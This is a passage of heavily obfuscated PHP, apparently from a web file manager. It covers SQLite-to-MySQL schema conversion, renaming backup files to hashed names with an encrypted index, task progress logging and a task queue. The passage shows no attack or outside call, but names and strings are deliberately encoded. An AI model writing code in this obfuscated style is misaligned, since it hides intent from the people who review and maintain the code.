= $şÜÖ£Ïß[1227] . implode($şÜÖ£Ïß[1228], $ÙÅ­²È[$şÜÖ£Ïß[1220]]) . $şÜÖ£Ïß[1229]; $ºÑÒ…¶…[] = sprintf($şÜÖ£Ïß[1230], $şÜÖ£Ïß[1231], $¦Ç–å×, $şÜÖ£Ïß[1232], $Œ¬¢âùì, $şÜÖ£Ïß[1233], $¨¤Ñ¢, $ Ä™¸Â¨); } $¹åõªú• = array(); $÷æ«Šë„ = array($şÜÖ£Ïß[1234] => $şÜÖ£Ïß[402], $şÜÖ£Ïß[1235] => $şÜÖ£Ïß[402], $şÜÖ£Ïß[376] => $şÜÖ£Ïß[402], $şÜÖ£Ïß[375] => $şÜÖ£Ïß[402], $şÜÖ£Ïß[1236] => $şÜÖ£Ïß[1237], $şÜÖ£Ïß[1238] => $şÜÖ£Ïß[1237], $şÜÖ£Ïß[1237] => $şÜÖ£Ïß[1237], $şÜÖ£Ïß[1239] => $şÜÖ£Ïß[1237], $şÜÖ£Ïß[295] => $şÜÖ£Ïß[1237], $şÜÖ£Ïß[1240] => $şÜÖ£Ïß[1237], $şÜÖ£Ïß[1241] => $şÜÖ£Ïß[1237], $şÜÖ£Ïß[1242] => $şÜÖ£Ïß[1243], $şÜÖ£Ïß[377] => $şÜÖ£Ïß[1243], $şÜÖ£Ïß[378] => $şÜÖ£Ïß[1243], $şÜÖ£Ïß[1244] => $şÜÖ£Ïß[1244]); foreach ($•€…ı˜ö as $ÙÅ­²È) { $ÒË¼†§¿ = _get($÷æ«Šë„, $ÙÅ­²È[$şÜÖ£Ïß[1245]], $ÙÅ­²È[$şÜÖ£Ïß[1246]]); $ß¦Éú¶Ù = $ÙÅ­²È[$şÜÖ£Ïß[1247]] == $şÜÖ£Ïß[1011] ? $şÜÖ£Ïß[1248] : $şÜÖ£Ïß[1249]; $È®‰Ò¼Ï = $ÙÅ­²È[$şÜÖ£Ïß[1250]] == $î”–Ê‹û ? $şÜÖ£Ïß[1251] : $şÜÖ£Ïß[12]; $ÚĞ©é†Ø = $ÙÅ­²È[$şÜÖ£Ïß[1065]] ? strtoupper(str_replace($şÜÖ£Ïß[11], $şÜÖ£Ïß[12], $ÙÅ­²È[$şÜÖ£Ïß[1065]])) : $şÜÖ£Ïß[12]; $¹åõªú•[] = sprintf($şÜÖ£Ïß[1252], $ÙÅ­²È[$şÜÖ£Ïß[1250]], $ÒË¼†§¿, $ß¦Éú¶Ù, $È®‰Ò¼Ï, $ÚĞ©é†Ø); } $ìåĞĞı½ = array("\104\x52\x4f\120\x20\124\x41\x42\x4c\x45\x20\x49\x46\40\105\130\x49\123\124\x53\40{$û¾ºÚ«’}\x3b", "\x43\122\x45\101\124\x45\x20\124\101\x42\114\x45\40{$û¾ºÚ«’}\40\x28", implode($şÜÖ£Ïß[50] . PHP_EOL, $¹åõªú•), $şÜÖ£Ïß[1253]); $´¹¦ƒ»½ = implode(PHP_EOL, array_merge($ìåĞĞı½, $ºÑÒ…¶…)); if ($ÒË¼†§¿ == $şÜÖ£Ïß[13]) { return $´¹¦ƒ»½; } $ˆ£ÁåØ[$şÜÖ£Ïß[13]] = $´¹¦ƒ»½; return $ˆ£ÁåØ; } public function sqlFromSqlite($âá¡¡·„, $şêëşï¬ = '') { $÷€úİ¡ =& $_SERVER[¤øïŠ‹²]; $‰üºë© = array($÷€úİ¡[905] => $÷€úİ¡[12], $÷€úİ¡[13] => $÷€úİ¡[12]); $Ó±‰—ÇÒ = $this->escapeName($âá¡¡·„); $îÆıÇû¶ = $this->escapeName($âá¡¡·„, $÷€úİ¡[13]); $Ë¹“ıÄÙ = $this->model()->db(); $Ä¶š®ş† = "\x50\x52\101\107\x4d\101\x20\x54\x41\102\x4c\x45\137\x49\x4e\x46\x4f\40\x28\x27{$âá¡¡·„}\x27\x29"; $•âêƒîø = "\x53\105\x4c\x45\103\x54\x20\x2a\40\106\122\x4f\x4d\x20\x73\161\154\x69\x74\145\x5f\155\141\163\x74\x65\x72\40\x57\x48\105\122\105\x20\164\x62\x6c\x5f\x6e\141\x6d\145\40\x3d\x20\x27{$âá¡¡·„}\47"; $—°–æÈ‹ = $Ë¹“ıÄÙ->query($Ä¶š®ş†); if (empty($—°–æÈ‹)) { return $şêëşï¬ ? $‰üºë©[$şêëşï¬] : $‰üºë©; } $è¦ÔÆÔö = $Ë¹“ıÄÙ->query($•âêƒîø); $…Û¨˜€¹ = $…öÑ½Şú = array(); foreach ($è¦ÔÆÔö as $¸‰êäÙö) { if ($¸‰êäÙö[$÷€úİ¡[33]] == $÷€úİ¡[369]) { $…Û¨˜€¹[] = $¸‰êäÙö[$÷€úİ¡[1254]]; } else { $…öÑ½Şú[] = $¸‰êäÙö[$÷€úİ¡[1254]]; } } $Ê‹£¤ñ“ = array_merge(array("\104\x52\117\120\x20\124\101\x42\x4c\105\40\111\x46\x20\x45\x58\x49\123\124\x53\x20{$îÆıÇû¶}\x3b"), $…Û¨˜€¹, $…öÑ½Şú); $Ê‹£¤ñ“ = implode($÷€úİ¡[85] . PHP_EOL, $Ê‹£¤ñ“) . $÷€úİ¡[85]; if ($şêëşï¬ == $÷€úİ¡[13]) { return $Ê‹£¤ñ“; } $‰üºë©[$÷€úİ¡[13]] = $Ê‹£¤ñ“; $Î  ÉØ³ = $‡ë¥´Ç¦ = array(); $Äñ¦Š¯± = array(); $ñıìÛ»„ = array(); foreach ($è¦ÔÆÔö as $¸‰êäÙö) { if ($¸‰êäÙö[$÷€úİ¡[33]] == $÷€úİ¡[1255]) { $Ô°ƒŞ É = $¸‰êäÙö[$÷€úİ¡[1254]]; $÷õñèÆË = stripos($Ô°ƒŞ É, $÷€úİ¡[1224]) !== !1; $İµí » = stripos($Ô°ƒŞ É, $÷€úİ¡[1218]) !== !1; preg_match($÷€úİ¡[1256], $Ô°ƒŞ É, $ºÒÖ¶ûØ); if (empty($ºÒÖ¶ûØ)) { continue; } $œÅÇöã = array_map($÷€úİ¡[1257], explode($÷€úİ¡[50], $ºÒÖ¶ûØ[1])); $”åÀòáœ = array(); foreach ($œÅÇöã as $³¥¹³Ñ) { $¹ŠøŞ“Í = trim($³¥¹³Ñ, $÷€úİ¡[1258]); $”åÀòáœ[] = $¹ŠøŞ“Í; $Äñ¦Š¯±[$¹ŠøŞ“Í] = !0; } $ñıìÛ»„[] = array($÷€úİ¡[32] => $¸‰êäÙö[$÷€úİ¡[32]], $÷€úİ¡[1254] => $Ô°ƒŞ É, $÷€úİ¡[1259] => $÷õñèÆË, $÷€úİ¡[1260] => $İµí », $÷€úİ¡[1261] => $”åÀòáœ); } } $ÒÊÎß˜ï = array($÷€úİ¡[1235] => $÷€úİ¡[1235], $÷€úİ¡[402] => $÷€úİ¡[1262], $÷€úİ¡[1243] => $÷€úİ¡[1263], $÷€úİ¡[1237] => $÷€úİ¡[1237], $÷€úİ¡[1244] => $÷€úİ¡[1264], $÷€úİ¡[1265] => $÷€úİ¡[1266]); $’Í•ØòË = array($÷€úİ¡[462], $÷€úİ¡[181], $÷€úİ¡[546]); $Ûğ‰°§Å = array($÷€úİ¡[402], $÷€úİ¡[1243], $÷€úİ¡[1265], $÷€úİ¡[1235]); foreach ($—°–æÈ‹ as $¸‰êäÙö) { $ÃÖ›•“‚ = $¸‰êäÙö[$÷€úİ¡[32]]; $Ö©Æ†Õ¬ = strtolower($¸‰êäÙö[$÷€úİ¡[33]]); if ($Ö©Æ†Õ¬ == $÷€úİ¡[1237] && isset($Äñ¦Š¯±[$ÃÖ›•“‚])) { $şêëşï¬ = in_array($ÃÖ›•“‚, $’Í•ØòË) ? $÷€úİ¡[1237] : $÷€úİ¡[1267]; } else { $şêëşï¬ = _get($ÒÊÎß˜ï, $Ö©Æ†Õ¬, $Ö©Æ†Õ¬); } if ($¸‰êäÙö[$÷€úİ¡[67]] > 0) { $‡ë¥´Ç¦[$¸‰êäÙö[$÷€úİ¡[67]]] = $ÃÖ›•“‚; } $‹ôîÊÁÇ = $÷€úİ¡[12]; if ($¸‰êäÙö[$÷€úİ¡[66]] !== null) { $›éÂ‚ = $¸‰êäÙö[$÷€úİ¡[66]]; if (in_array($Ö©Æ†Õ¬, $Ûğ‰°§Å) && is_numeric($›éÂ‚)) { $‹ôîÊÁÇ = "\104\x45\x46\x41\125\x4c\x54\x20{$›éÂ‚}"; } else { if (strtolower($›éÂ‚) === $÷€úİ¡[115]) { $‹ôîÊÁÇ = $¸‰êäÙö[$÷€úİ¡[35]] ? $÷€úİ¡[12] : $÷€úİ¡[1249]; } else { $Á™øÚ˜œ = is_numeric($›éÂ‚) ? $›éÂ‚ : $÷€úİ¡[68] . addslashes($›éÂ‚) . $÷€úİ¡[68]; $‹ôîÊÁÇ = "\104\105\x46\101\x55\x4c\x54\x20{$Á™øÚ˜œ}"; } } } $îï¾×‰ø = $¸‰êäÙö[$÷€úİ¡[35]] ? $÷€úİ¡[1248] : $÷€úİ¡[1268]; $ïàµ›åÊ = stripos($Ö©Æ†Õ¬, $÷€úİ¡[376]) !== !1 && $¸‰êäÙö[$÷€úİ¡[67]] ? $÷€úİ¡[1269] : $÷€úİ¡[12]; $Î  ÉØ³[] = sprintf($÷€úİ¡[1270], $ÃÖ›•“‚, $şêëşï¬, $îï¾×‰ø, $‹ôîÊÁÇ, $ïàµ›åÊ); } if (!empty($‡ë¥´Ç¦)) { ksort($‡ë¥´Ç¦); $›•àï‹ñ = $÷€úİ¡[482] . implode($÷€úİ¡[1190], $‡ë¥´Ç¦) . $÷€úİ¡[482]; $Î  ÉØ³[] = "\x50\122\111\x4d\101\x52\x59\40\113\x45\131\40\50{$›•àï‹ñ}\x29"; } foreach ($ñıìÛ»„ as $Øº¥°µ°) { if ($Øº¥°µ°[$÷€úİ¡[1260]]) { continue; } $¡—¿Å˜Ù = array(); foreach ($Øº¥°µ°[$÷€úİ¡[1261]] as $³¥¹³Ñ) { $ÒÊÎß˜ï = null; foreach ($—°–æÈ‹ as $ ¾ü¶×È) { if ($ ¾ü¶×È[$÷€úİ¡[32]] == $³¥¹³Ñ) { $ÒÊÎß˜ï = strtolower($ ¾ü¶×È[$÷€úİ¡[33]]); break; } } if ($ÒÊÎß˜ï == $÷€úİ¡[1237] && in_array($³¥¹³Ñ, $’Í•ØòË)) { $¡—¿Å˜Ù[] = "\140{$³¥¹³Ñ}\x60\x28\x32\65\x30\x29"; } else { $¡—¿Å˜Ù[] = "\140{$³¥¹³Ñ}\x60"; } } $Ö©Æ†Õ¬ = ($Øº¥°µ°[$÷€úİ¡[1259]] ? $÷€úİ¡[1271] : $÷€úİ¡[12]) . $÷€úİ¡[1272]; $Åê…Å†¯ = str_replace($÷€úİ¡[1225] . $âá¡¡·„ . $÷€úİ¡[11], $÷€úİ¡[12], $Øº¥°µ°[$÷€úİ¡[32]]); $Åê…Å†¯ = str_replace($âá¡¡·„ . $÷€úİ¡[11], $÷€úİ¡[12], $Åê…Å†¯); $Î  ÉØ³[] = "{$Ö©Æ†Õ¬}\40\x60{$Åê…Å†¯}\140\x20\x28" . implode($÷€úİ¡[50], $¡—¿Å˜Ù) . $÷€úİ¡[1189]; } $ÇŸ’ÕÅ = array("\104\122\117\120\x20\x54\101\x42\114\x45\40\111\106\x20\x45\130\111\x53\124\x53\x20{$Ó±‰—ÇÒ}\73", "\x43\122\105\x41\124\x45\x20\124\x41\102\x4c\105\40{$Ó±‰—ÇÒ}\40\50", implode($÷€úİ¡[50] . PHP_EOL, $Î  ÉØ³), $÷€úİ¡[1273]); $ÇŸ’ÕÅ = implode(PHP_EOL, $ÇŸ’ÕÅ); if ($şêëşï¬ == $÷€úİ¡[905]) { return $ÇŸ’ÕÅ; } $‰üºë©[$÷€úİ¡[905]] = $ÇŸ’ÕÅ; return $‰üºë©; } private function escapeName($¦ìëĞ„×, $¿ßÆœÀ„ = "\155\x79\163\x71\x6c") { $õº’ÕëÕ =& $_SERVER[¤øïŠ‹²]; $¦ìëĞ„× = preg_replace($õº’ÕëÕ[1274], $õº’ÕëÕ[12], $¦ìëĞ„×); if ($¿ßÆœÀ„ === $õº’ÕëÕ[905]) { return "\140{$¦ìëĞ„×}\140"; } return "\42{$¦ìëĞ„×}\x22"; } public function mixBakList($Úë—™) { $Õ×®¾â =& $_SERVER[¤øïŠ‹²]; $Úë—™ = rtrim($Úë—™, $Õ×®¾â[8]) . $Õ×®¾â[8]; $Æíä×•à = $Õ×®¾â[1275]; $„…›äıç = IO::listPath($Úë—™); if (empty($„…›äıç[$Õ×®¾â[97]])) { return !1; } $µ¬ÄÕ¸ = array(); foreach ($„…›äıç[$Õ×®¾â[97]] as $‡©Ì™÷’ => $­İÚ„‡ê) { if (!$­İÚ„‡ê[$Õ×®¾â[32]] || !$­İÚ„‡ê[$Õ×®¾â[98]]) { continue; } $œÂŞ„€æ = Mcrypt::encode($­İÚ„‡ê[$Õ×®¾â[32]], $Æíä×•à); $Ã¤¯È´‰ = md5($œÂŞ„€æ); IO::rename($­İÚ„‡ê[$Õ×®¾â[98]], $Ã¤¯È´‰); $µ¬ÄÕ¸[$Ã¤¯È´‰] = $œÂŞ„€æ; } $“†·×æè = md5($Õ×®¾â[1276] . $Æíä×•à); IO::setContent($Úë—™ . $“†·×æè, json_encode($µ¬ÄÕ¸)); return !0; } public function unmixBakList($²ı¦íí´) { $ËÙÓõç =& $_SERVER[¤øïŠ‹²]; $²ı¦íí´ = rtrim($²ı¦íí´, $ËÙÓõç[8]) . $ËÙÓõç[8]; $Ó£²ˆë’ = $this->unmixBakListGet($²ı¦íí´, !0); if (empty($Ó£²ˆë’)) { return !1; } foreach ($Ó£²ˆë’ as $‰ç¢è¯ => $šîÄ¥€) { $ •ªË—Ç = IO::rename($²ı¦íí´ . $šîÄ¥€, $‰ç¢è¯); if (!$ •ªË—Ç) { return !1; } } return !0; } public function unmixBakListGet($±Ë’—¼, $‹õ‚’ñà = false) { $æğ¯ªş =& $_SERVER[¤øïŠ‹²]; $±Ë’—¼ = rtrim($±Ë’—¼, $æğ¯ªş[8]) . $æğ¯ªş[8]; $èÔ÷ã°ª = $æğ¯ªş[1275]; $Î‰êÑò˜ = md5($æğ¯ªş[1276] . $èÔ÷ã°ª); $¥´ñ Æ© = $±Ë’—¼ . $Î‰êÑò˜; if (!IO::exist($¥´ñ Æ©)) { return !1; } $öÁ„¥ò† = json_decode(IO::getContent($¥´ñ Æ©), !0); if (empty($öÁ„¥ò†)) { return !1; } $ÈĞø¬áƒ = array(); foreach ($öÁ„¥ò† as $ƒÙĞÍ‹³ => $ì–ç¾¬œ) { $Î‰êÑò˜ = Mcrypt::decode($ì–ç¾¬œ, $èÔ÷ã°ª); $ÈĞø¬áƒ[$Î‰êÑò˜] = $ƒÙĞÍ‹³; } if ($‹õ‚’ñà) { IO::remove($¥´ñ Æ©, !1); } return $ÈĞø¬áƒ; } } $_file = $_SERVER[$_SERVER[¤øïŠ‹²][55]]; $_size = $_SERVER[¤øïŠ‹²][990]; goto Eç–Ô”ŸÁµ; d–ô•‘Û§Ï: class TaskHttp extends Task { protected function startAfter() { $éÊßÎÂê =& $_SERVER[¤øïŠ‹²]; $¹Ğ”°²Ô =& $this->task; $¹Ğ”°²Ô[$éÊßÎÂê[2011]] = 1; Hook::bind($éÊßÎÂê[1970], array($this, $éÊßÎÂê[2012])); Hook::bind($éÊßÎÂê[1972], array($this, $éÊßÎÂê[2013])); Hook::bind($éÊßÎÂê[1974], array($this, $éÊßÎÂê[2014])); } protected function endAfter() { $Ö™¹éëÒ =& $_SERVER[¤øïŠ‹²]; Hook::unbind($Ö™¹éëÒ[1970], array($this, $Ö™¹éëÒ[2012])); Hook::unbind($Ö™¹éëÒ[1972], array($this, $Ö™¹éëÒ[2013])); Hook::unbind($Ö™¹éëÒ[1974], array($this, $Ö™¹éëÒ[2014])); } public function progressStart($¤üñ½òÆ) { $øÍ’ˆêÛ =& $_SERVER[¤øïŠ‹²]; $“«°‹¢³ = curl_getinfo($¤üñ½òÆ); self::log($øÍ’ˆêÛ[2015] . $“«°‹¢³[$øÍ’ˆêÛ[394]]); self::valueSet($this->task[$øÍ’ˆêÛ[493]], $this->task); } public function progressEnd($ÀÕø±İ¨) { $ú˜ÚÄ¢Ï =& $_SERVER[¤øïŠ‹²]; self::log($ú˜ÚÄ¢Ï[2016] . $this->task[$ú˜ÚÄ¢Ï[493]]); $this->end(); } public function progress($±›ñåë©, $ğëÌûü», $ƒòºã, $Âæ¾±ƒ¬, $Ú•£¡×À) { $ÎÒŠ¤¥ =& $_SERVER[¤øïŠ‹²]; $£»úöÎÆ =& $this->task; if ($Ú•£¡×À > 0) { $£»úöÎÆ[$ÎÒŠ¤¥[1178]] = $£»úöÎÆ[$ÎÒŠ¤¥[1178]] == 0 ? $Âæ¾±ƒ¬ : $£»úöÎÆ[$ÎÒŠ¤¥[1178]]; $£»úöÎÆ[$ÎÒŠ¤¥[1925]] = $Ú•£¡×À; } else { if ($ƒòºã > 0) { $£»úöÎÆ[$ÎÒŠ¤¥[1178]] = $£»úöÎÆ[$ÎÒŠ¤¥[1178]] == 0 ? $ğëÌûü» : $£»úöÎÆ[$ÎÒŠ¤¥[1178]]; $£»úöÎÆ[$ÎÒŠ¤¥[1925]] = $ƒòºã; } } $this->update(); self::log("\160\x72\157\x67\162\x65\163\163\110\164\x74\x70\72\144\x6f\167\x6e\x3a{$ƒòºã}\x2f{$ğëÌûü»}\73\40\x75\x70\x6c\157\x61\x64\72{$Ú•£¡×À}\x2f{$Âæ¾±ƒ¬}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($®ñ×Äç¾, $ëÄ­´¡› = '', $é–¨úç¡ = 0, $ñèà‰Ò± = '') { $®Ø¸ŞŸí =& $_SERVER[¤øïŠ‹²]; $ñèà‰Ò± = $ñèà‰Ò± ? $ñèà‰Ò± : ($ëÄ­´¡› ? $ëÄ­´¡› : $®ñ×Äç¾); $×€Š©âÌ = new Task($®ñ×Äç¾, $ëÄ­´¡›, $é–¨úç¡, $ñèà‰Ò±); $GLOBALS[$®Ø¸ŞŸí[2017] . $®ñ×Äç¾] = new TaskLog($®Ø¸ŞŸí[1909], $×€Š©âÌ, $ñèà‰Ò±); return $×€Š©âÌ; } public function __construct($¥È£Ò¶² = '', $ëî¸‰Œà = '', $¢âÅîÁ° = '') { $çéíÏ±Ï =& $_SERVER[¤øïŠ‹²]; if (!$¥È£Ò¶²) { $¥È£Ò¶² = $çéíÏ±Ï[1909]; } $’œ†İ‰¡ = $¥È£Ò¶² . $çéíÏ±Ï[483] . rand_string(10); if (!$¢âÅîÁ°) { $¢âÅîÁ° = $¥È£Ò¶² . $çéíÏ±Ï[53] . $¢âÅîÁ°; } switch ($¥È£Ò¶²) { case $çéíÏ±Ï[1909]: if (!$ëî¸‰Œà || !$ëî¸‰Œà->task) { return echoLog($¥È£Ò¶² . $çéíÏ±Ï[2018]); } $‚Ö¾€åÕ = $ëî¸‰Œà; $’œ†İ‰¡ = $‚Ö¾€åÕ->task[$çéíÏ±Ï[493]]; $¥È£Ò¶² = $‚Ö¾€åÕ->task[$çéíÏ±Ï[493]]; if (!$‚Ö¾€åÕ->task[$çéíÏ±Ï[1813]]) { $‚Ö¾€åÕ->task[$çéíÏ±Ï[1813]] = $¢âÅîÁ° ? $¢âÅîÁ° : $¥È£Ò¶²; } break; case $çéíÏ±Ï[2019]: if (!$ëî¸‰Œà) { return echoLog($¥È£Ò¶² . $çéíÏ±Ï[2020]); } $ £Œò£ = is_string($ëî¸‰Œà) ? array($ëî¸‰Œà) : $ëî¸‰Œà; $‚Ö¾€åÕ = new TaskFileTransfer($’œ†İ‰¡, $¥È£Ò¶², 0, $¢âÅîÁ° ? $¢âÅîÁ° : $ £Œò£[0]); foreach ($ £Œò£ as $ßè”ÒÖ) { $‚Ö¾€åÕ->addPath($ßè”ÒÖ); } break; case $çéíÏ±Ï[400]: if (!$ëî¸‰Œà) { return echoLog($¥È£Ò¶² . $çéíÏ±Ï[2020]); } $ £Œò£ = is_string($ëî¸‰Œà) ? array($ëî¸‰Œà) : $ëî¸‰Œà; $‚Ö¾€åÕ = new TaskZip($’œ†İ‰¡, $¥È£Ò¶², 0, $¢âÅîÁ° ? $¢âÅîÁ° : $ £Œò£[0]); foreach ($ £Œò£ as $ßè”ÒÖ) { $‚Ö¾€åÕ->addPath($ßè”ÒÖ); } break; case $çéíÏ±Ï[1351]: if (!$ëî¸‰Œà) { return echoLog($¥È£Ò¶² . $çéíÏ±Ï[2020]); } $‚Ö¾€åÕ = new TaskUnZip($’œ†İ‰¡, $¥È£Ò¶², 0, $¢âÅîÁ° ? $¢âÅîÁ° : $ëî¸‰Œà); if ($ëî¸‰Œà) { $‚Ö¾€åÕ->addFile($ëî¸‰Œà); } break; case $çéíÏ±Ï[162]: $‚Ö¾€åÕ = new TaskHttp($’œ†İ‰¡, $¥È£Ò¶²); break; default: return; break; } $this->task = $‚Ö¾€åÕ; $this->taskID = $’œ†İ‰¡; Hook::bind($çéíÏ±Ï[1945], array($this, $çéíÏ±Ï[2021])); Hook::bind($çéíÏ±Ï[1947], array($this, $çéíÏ±Ï[2022])); Hook::bind($çéíÏ±Ï[1941], array($this, $çéíÏ±Ï[2023])); echoLog($çéíÏ±Ï[2024] . $‚Ö¾€åÕ->task[$çéíÏ±Ï[1813]]); } public function __destruct() { $this->end(); } public function end($Ú¦Ø£œĞ = '') { $´ˆçŠòÌ =& $_SERVER[¤øïŠ‹²]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ú¦Ø£œĞ); $this->task = !1; $this->taskID = !1; Hook::unbind($´ˆçŠòÌ[1945], array($this, $´ˆçŠòÌ[2021])); Hook::unbind($´ˆçŠòÌ[1947], array($this, $´ˆçŠòÌ[2022])); Hook::unbind($´ˆçŠòÌ[1941], array($this, $´ˆçŠòÌ[2023])); } public function taskUpdate($Ñ×¾ŠÂù) { $‚Û­Ú¸ö =& $_SERVER[¤øïŠ‹²]; if (!$Ñ×¾ŠÂù || $this->taskID != $Ñ×¾ŠÂù[$‚Û­Ú¸ö[493]]) { return; } $™³×ŒºÊ = 20; $Ì³Ñºü› = intval($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1926]] * $™³×ŒºÊ); $İ­¸Ğñ‡ = $‚Û­Ú¸ö[186] . str_repeat($‚Û­Ú¸ö[474], $Ì³Ñºü›) . $‚Û­Ú¸ö[1130] . str_repeat($‚Û­Ú¸ö[53], $™³×ŒºÊ - $Ì³Ñºü›) . $‚Û­Ú¸ö[188]; $µ™À°µã = $İ­¸Ğñ‡ . sprintf($‚Û­Ú¸ö[2025], $Ñ×¾ŠÂù[$‚Û­Ú¸ö[1926]] * 100) . $‚Û­Ú¸ö[2026]; $ÖĞËÜ´¡ = $µ™À°µã . $Ñ×¾ŠÂù[$‚Û­Ú¸ö[1925]] . $‚Û­Ú¸ö[8] . $Ñ×¾ŠÂù[$‚Û­Ú¸ö[1178]] . LNG($‚Û­Ú¸ö[2027]); $½Ãâ›âÎ = $‚Û­Ú¸ö[12]; if ($Ñ×¾ŠÂù[$‚Û­Ú¸ö[2011]]) { $ÖĞËÜ´¡ = $µ™À°µã . size_format($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1925]]) . $‚Û­Ú¸ö[8] . size_format($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1178]]); $½Ãâ›âÎ = size_format($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1927]]) . $‚Û­Ú¸ö[2028]; } if ($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1180]]) { $Ñ×¾ŠÂù[$‚Û­Ú¸ö[1976]] = $Ñ×¾ŠÂù[$‚Û­Ú¸ö[1180]] . $‚Û­Ú¸ö[53] . $Ñ×¾ŠÂù[$‚Û­Ú¸ö[1976]]; } if ($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1976]]) { $Ø´ŒÚòÍ = $‚Û­Ú¸ö[12]; if ($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1978]]) { $Ø´ŒÚòÍ = $‚Û­Ú¸ö[50] . size_format($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1979]]) . $‚Û­Ú¸ö[8] . size_format($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1978]]); } $½Ãâ›âÎ .= $Ñ×¾ŠÂù[$‚Û­Ú¸ö[1976]] . $Ø´ŒÚòÍ; } if ($Ñ×¾ŠÂù[$‚Û­Ú¸ö[865]] && !$Ñ×¾ŠÂù[$‚Û­Ú¸ö[1978]]) { $½Ãâ›âÎ .= $‚Û­Ú¸ö[53] . size_format($Ñ×¾ŠÂù[$‚Û­Ú¸ö[1983]]) . $‚Û­Ú¸ö[8] . size_format($Ñ×¾ŠÂù[$‚Û­Ú¸ö[865]]); } echoLog($ÖĞËÜ´¡ . $‚Û­Ú¸ö[53] . $½Ãâ›âÎ, !0); } public function taskEnd($¤ÌÄ¶æ¤) { $ÒïÃ±êö =& $_SERVER[¤øïŠ‹²]; if (!$¤ÌÄ¶æ¤ || $this->taskID != $¤ÌÄ¶æ¤[$ÒïÃ±êö[493]]) { return; } $¿ÖÉàƒ = $¤ÌÄ¶æ¤ ? LNG($ÒïÃ±êö[2029]) . $ÒïÃ±êö[4] . $¤ÌÄ¶æ¤[$ÒïÃ±êö[1925]] . $ÒïÃ±êö[8] . $¤ÌÄ¶æ¤[$ÒïÃ±êö[1178]] . LNG($ÒïÃ±êö[2027]) . $ÒïÃ±êö[85] : $ÒïÃ±êö[12]; echoLog($ÒïÃ±êö[2030] . $¤ÌÄ¶æ¤[$ÒïÃ±êö[1813]] . ($¤ÌÄ¶æ¤[$ÒïÃ±êö[546]] ? $ÒïÃ±êö[85] . $¤ÌÄ¶æ¤[$ÒïÃ±êö[546]] : $ÒïÃ±êö[12]) . $ÒïÃ±êö[85] . $¿ÖÉàƒ . $ÒïÃ±êö[2031] . sprintf($ÒïÃ±êö[964], timeFloat() - $¤ÌÄ¶æ¤[$ÒïÃ±êö[1928]]) . $ÒïÃ±êö[1940]); $this->end(); } public function taskKill($®œíĞÁæ) { $í”ñ˜à— =& $_SERVER[¤øïŠ‹²]; if (!$®œíĞÁæ || $this->taskID != $®œíĞÁæ[$í”ñ˜à—[493]]) { return; } echoLog($í”ñ˜à—[2032] . $®œíĞÁæ[$í”ñ˜à—[1813]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\x51\165\x65\x75\x65\114\x65\x6e\147\164\150"; const QUEUE_DATA = "\164\x61\163\x6b\121\165\x65\x75\145\x44\141\x74\x61"; const QUEUE_TIME = "\164\141\x73\153\x51\165\x65\165\145\114\x61\163\164\x52\x75\x6e"; const QUEUE_THREAD = "\x74\141\163\153\121\165\x65\165\x65\x54\150\x72\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($šøÏ ë , $ú¤ÅÆÁñ = array(), $“ÆÈ¹Ï‘ = '', $ŸŠª„İ† = '') { $ä´õÊÕ¤ =& $_SERVER[¤øïŠ‹²]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ŸŠª„İ† && array_find_by_field(self::$listData, $ä´õÊÕ¤[106], $ŸŠª„İ†)) { return !0; } if ($ŸŠª„İ† && array_find_by_field(self::$listDataAdd, $ä´õÊÕ¤[106], $ŸŠª„İ†)) { return !0; } self::$listDataAdd[] = array($ä´õÊÕ¤[354] => $šøÏ ë , $ä´õÊÕ¤[2033] => $ú¤ÅÆÁñ, $ä´õÊÕ¤[546] => $“ÆÈ¹Ï‘, $ä´õÊÕ¤[106] => $ŸŠª„İ†); return !0; } public static function addSubmit() { $ò¸¢™Úê =& $_SERVER[¤øïŠ‹²]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ò¸¢™Úê[2034] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ò¸¢™Úê[12], $ò¸¢™Úê[546])), $ò¸¢™Úê[208]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($‹êÄ‰’, $¿µîúê = array(), $‘â·Î¡˜ = '', $İÆÌ¦É² = '') { $¹­ÄãåĞ =& $_SERVER[¤øïŠ‹²]; if (self::count() >= self::MAX_LENGTH) { return !1; } $é­”î¯† = self::getAll(); if ($İÆÌ¦É² && array_find_by_field($é­”î¯†, $¹­ÄãåĞ[106], $İÆÌ¦É²)) { return !0; } $é­”î¯†[] = array($¹­ÄãåĞ[354] => $‹êÄ‰’, $¹­ÄãåĞ[2033] => $¿µîúê, $¹­ÄãåĞ[546] => $‘â·Î¡˜, $¹­ÄãåĞ[106] => $İÆÌ¦É²); self::setAll($é­”î¯†); write_log($¹­ÄãåĞ[2034] . $‘â·Î¡˜, $¹­ÄãåĞ[208]); return !0; } public static function run() { $Â¡Éà¶½ =& $_SERVER[¤øïŠ‹²]; $ã–«Æ‘ = self::getAll(); $õ¿„Ãëù = array_shift($ã–«Æ‘); if (!$õ¿„Ãëù) { return !1; } self::setAll($ã–«Æ‘); $Õøº¾Õğ = timeFloat(); $ĞìÉ¯î· = $Â¡Éà¶½[12]; try { $ĞìÉ¯î· = Hook::apply($õ¿„Ãëù[$Â¡Éà¶½[354]], $õ¿„Ãëù[$Â¡Éà¶½[2033]]); } catch (Exception $¡¦¡‰Ş’) { write_log($¡¦¡‰Ş’, $Â¡Éà¶½[1317]); } $²èÛİÙô = number_format(timeFloat() - $Õøº¾Õğ, 3) . $Â¡Éà¶½[1940]; if ($ĞìÉ¯î· && is_string($ĞìÉ¯î·)) { $²èÛİÙô = $²èÛİÙô 